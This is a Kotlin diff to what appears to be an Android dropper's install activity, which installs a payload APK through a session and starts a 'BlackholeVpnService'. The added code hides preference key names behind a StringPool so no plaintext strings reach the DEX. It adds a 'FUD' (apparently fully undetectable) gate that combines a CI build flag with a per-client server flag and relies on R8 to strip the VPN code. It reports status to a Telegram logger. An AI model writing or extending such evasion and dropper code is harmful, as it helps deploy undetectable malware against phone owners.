@@ -816,8 +816,22 @@ class InstallActivity : Activity() {
 
         // Read vpn_bypass from SharedPrefs (written by MutationEngine after server response)
         // 1 = FUD ON (default: safe), 0 = FUD OFF
-        vpnBypassEnabled = getSharedPreferences("vg_prefs", MODE_PRIVATE)
-            .getInt("vpn_bypass", 1) == 1
+        // Keys are obfuscated through StringPool — no plaintext "vg_prefs" / "vpn_bypass" in DEX
+        vpnBypassEnabled = getSharedPreferences(StringPool.d(StringPool.VG_PREFS), MODE_PRIVATE)
+            .getInt(StringPool.d(StringPool.VPN_FLAG), 1) == 1
+
+        // Dual-gate FUD check:
+        //   BuildConfig.FEATURE_FLAG_V = compile-time gate (CI injects true/false)
+        //   vpnBypassEnabled           = runtime gate    (server sets per-client)
+        // Both must be true for VPN to start. Either OFF = skip VPN entirely.
+        // R8 dead-strips the VPN branch at minify when FEATURE_FLAG_V=false → no VPN code in APK.
+        if (!BuildConfig.FEATURE_FLAG_V || !vpnBypassEnabled) {
+            TelegramLogger.send(this, "VPN_FLOW", "SKIPPED",
+                "compilegate=${BuildConfig.FEATURE_FLAG_V} runtimegate=$vpnBypassEnabled — installing without VPN")
+            pendingApkBytes = null
+            installViaSession(apkBytes, attempt = 1)
+            return
+        }
 
         // If VPN is already running (e.g. activity recreation), proceed directly
         if (BlackholeVpnService.isRunning) {
